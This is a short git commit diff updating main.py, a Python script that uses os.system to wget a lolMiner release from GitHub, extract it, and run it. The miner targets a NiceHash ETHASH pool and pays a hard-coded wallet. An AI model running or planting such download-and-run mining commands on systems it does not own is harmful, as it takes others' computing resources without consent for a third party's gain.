7df7e724c05681d0eb1f830c8ee0fe3fb3df94e9
RyuzenM <101698447+RyuzenM@users.noreply.github.com>
2022-07-22 18:31:13 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
 
-os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz")
-os.system("tar xf lolMiner_v1.28a_Lin64.tar.gz")
-os.chdir("1.28")
+os.system("wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz")
+os.system("tar -xvf lolMiner_v1.29_Lin64.tar.gz")
+os.chdir("1.29")
 os.system("./lolMiner --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 -u 3A5aBLHombyvMph6Z3smWAHrCCqi3sDNbB.rig2 --ethstratum ETHPROXY")
